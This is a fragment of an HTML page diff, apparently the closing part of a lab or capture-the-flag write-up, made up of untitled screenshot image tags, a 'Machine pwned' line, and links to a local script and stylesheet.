+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_34.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_35.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d943099%3Cbr/%3E%3Cbr/%3E1558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_36.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_37.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_38.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_39.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558/a4c85c19-cfd5-4382-a34d-c6eb52e2ca97-export-d8ab7745-0493-416d-8469-7d9430991558_Untitled_40.png" alt="Untitled" />
+<br /><br />
+Machine pwned@!@!
 <script src="/assets/js/matrix-overlay.js"></script></p>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
+
 
 </div>
 
